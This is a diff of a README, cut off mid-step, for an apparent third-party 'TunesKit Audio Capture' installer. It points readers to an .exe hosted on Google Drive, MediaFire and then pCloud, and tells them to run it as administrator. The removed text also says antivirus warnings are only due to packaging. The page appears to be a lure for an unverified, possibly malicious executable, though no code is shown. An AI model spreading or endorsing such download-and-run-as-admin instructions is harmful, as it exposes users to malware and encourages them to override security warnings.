@@ -1,76 +1,57 @@
-# 📦 TunesKit Audio Capture Installer
+# 🎧 TunesKit Audio Capture Installer
 
-🎧 Automated Windows installer for deploying TunesKit Audio Capture quickly and correctly.
+<p align="center">
 
----
+<img src="https://img.shields.io/badge/Windows-10%20%2F%2011-blue?style=for-the-badge&logo=windows">
 
-## 🚀 Overview
+<img src="https://img.shields.io/badge/Installer-Automatic-success?style=for-the-badge&logo=windows-terminal">
 
-This installer automatically sets up **TunesKit Audio Capture** on Windows systems.  
-It places all files in the correct system directories and creates shortcuts for easy access.
+<img src="https://img.shields.io/badge/Admin-Required-red?style=for-the-badge&logo=shield">
 
----
-
-## 📥 Download
-
-### 🔹 Google Drive (Recommended)
-👉 https://drive.google.com/file/d/1b_FrFjolQmPVCjAsJ5owV4GucB9c1DsV/view?usp=drive_link
-
-### 🔹 MediaFire
-👉 https://www.mediafire.com/file/645b53g1mvhao4y/TunesKitInstaller.exe/file
-
-⬇️ Click any link above and press **Download**.
+</p>
 
 ---
 
-## ⚙️ Installation
+# 📦 Overview
 
-1. Download the `.exe` file from one of the links above  
-2. Right-click the file → **Run as administrator**  
-3. Follow the installation steps  
-4. Wait until setup finishes  
-5. Launch from desktop shortcut or Start Menu  
+Professional automated installer for deploying  
+**TunesKit Audio Capture** on Windows systems.
 
----
+This setup automatically:
 
-## 📂 Installation Paths
-
-C:\Program Files (x86)\TunesKit Audio Capture\
-
-C:\ProgramData\TunesKit Audio Capture\
-
-🖥️ Desktop shortcut:
-TunesKit Audio Capture.lnk
+- 📁 Installs all required files
+- ⚙️ Configures directories correctly
+- 🖥️ Creates desktop shortcuts
+- 🚀 Launches quickly and cleanly
+- 🔒 Uses administrator permissions
 
 ---
 
-## ✨ Features
+# 📥 Download Installer
 
-- ⚡ Fast automatic installation  
-- 📁 Correct system folder setup  
-- 🖥️ Desktop shortcut creation  
-- 🔧 Fully automated extraction  
-- 🔒 Requires admin permissions  
-- 📦 Clean deployment package  
+<p align="center">
 
----
+<a href="https://u.pcloud.link/publink/show?code=VZ6jsU5ZMblFc8xwWHbexeG9QR7Q4j8rtTqy">
 
-## 🧠 Requirements
+<img src="https://img.shields.io/badge/⬇ DOWNLOAD INSTALLER-blue?style=for-the-badge">
 
-- Windows 10 / 11 (64-bit recommended)  
-- Administrator permissions  
-- ~200 MB free space  
+</a>
+
+</p>
 
 ---
 
-## ⚠️ Notes
+# ⚙️ Installation Guide
 
-- Run as administrator for correct installation  
-- Antivirus may warn due to installer packaging  
-- Do not rename the installer file  
+## 1️⃣ Download
+
+Download the installer using the button above.
 
 ---
 
-## 🎯 Summary
+## 2️⃣ Run Installer
 
-A simple and automated installer for deploying TunesKit Audio Capture on Windows PCs quickly and efficiently.
+Right-click:
+
+```txt
+Run as administrator
